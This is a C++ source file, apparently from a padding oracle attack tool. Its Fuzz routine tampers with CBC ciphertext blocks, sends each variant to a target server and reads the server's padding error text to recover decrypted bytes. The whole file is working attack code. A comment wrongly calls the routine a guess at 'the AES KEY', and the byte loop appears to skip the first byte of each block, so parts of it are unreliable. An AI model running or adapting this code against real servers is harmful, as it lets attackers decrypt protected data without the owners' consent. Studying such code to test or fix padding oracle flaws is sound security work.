#include <curl/curl.h>
#include <functional>
#include <stdexcept> 
#include <string>
#include <mutex>

#include "include/network.h"
#include "include/cracker.h"
#include "include/target.h"
#include "include/common.h"
#include "include/utils.h"
#include "include/log.h"

/*
Return wheter or not the server responded with an "incorrect padding error"
*/
bool PaddingError(std::string& response) {
    return response.find(Target::getErrMsg()) != std::string::npos;
}

/*
Calculates a decrypted byte based on fuzzing result:

we have x^d = pad (valid padding)
hence d = pad^x
and we have c^d = plain

*/
void Guess(
    const unsigned int& C, 
    const unsigned int& X, 
    const unsigned int& pad,
    CypherData& cypherData
) {
    const unsigned int bSize = Target::getBlockSize();
    if (bSize < pad || pad == 0) {
        throw std::out_of_range("Padding value error in Guess");
    } 
    
    int D = pad ^ X;
    cypherData.Pn[bSize-pad] = C ^ D;
    cypherData.Dn[bSize-pad] = D;
}


/*
Guess the AES KEY based on the padding oracle's responses.
TODO: explain details
*/
CypherData Fuzz(
    std::function<std::string(std::string&)> request, 
    std::vector<std::vector<unsigned int>>& blocks, 
    unsigned int k,
    std::function<std::string(const std::vector<unsigned int>&)> convert
) {
    const unsigned int blockSize = Target::getBlockSize();
    CypherData cypherData;
    cypherData.Dn.assign(blockSize, 0);
    cypherData.Pn.assign(blockSize, 0);

    const unsigned int nBlocks = k+2;
    bool padError = true;
    unsigned int p;
    unsigned int validPadding;

    std::vector<unsigned int>& block = blocks[k];
    std::string newCypher;
    std::string response;

    Log::info("Fuzzing block n°" + std::to_string(k+1) + "\n");
    try {
        unsigned int padStep = 1;
        unsigned int j;

        // For every byte, in reverse
        for (j=blockSize-1; j>0 && j<blockSize; j--) {
            std::vector<unsigned int> blockCopy(block);

            // if padding is at least 0x02
            for (p=0; p<padStep-1; p++) {
                // modify d to generate a valid padding
                validPadding = cypherData.Dn[blockSize-p-1] ^ padStep;
                                
                // modify the block with validPadding
                unsigned int ind = blockSize-p-1;
                blockCopy[ind] = validPadding;
            }

            // Testing each hex value
            unsigned int val;
            for (val = 0; val < 256; val++) {
                std::vector<unsigned int> newBlock(blockCopy);
                newBlock[j] = val;
                newCypher = BlocksToCypher(blocks, nBlocks, newBlock, k, blockSize, convert);
                
                // Senb this new cyphertext to the oracle
                try {
                    response = request(newCypher);
                } catch(const std::exception& e) {
                    throw std::runtime_error("Error while making a GET request: " + std::string(e.what()));
                }

                // Check if the page contains the padding error text info
                padError = PaddingError(response);
                response.clear();
                if (!padError) {
                    Guess(block[j], val, padStep, cypherData);
                    std::string strIndex = std::to_string(blockSize-padStep+1);
                    Log::info(
                        "[BLOCK-" + std::to_string(k) 
                        + "]-Found: D[" + strIndex
                        + "]=0x" + IntToHex(cypherData.Dn[blockSize-padStep])
                        + " | P["+ strIndex
                        + "]=0x" + IntToHex(cypherData.Pn[blockSize-padStep])
                    );
                    break;
                }
            }
            if (padError) Log::warning("No recovered data for byte " + std::to_string(blockSize-padStep+1));
            padError = true;
            padStep++;
        }

        return cypherData;

    } catch (const std::exception& e) {
        throw std::runtime_error("Error while fuzzing: " + std::string(e.what()));
    }
}
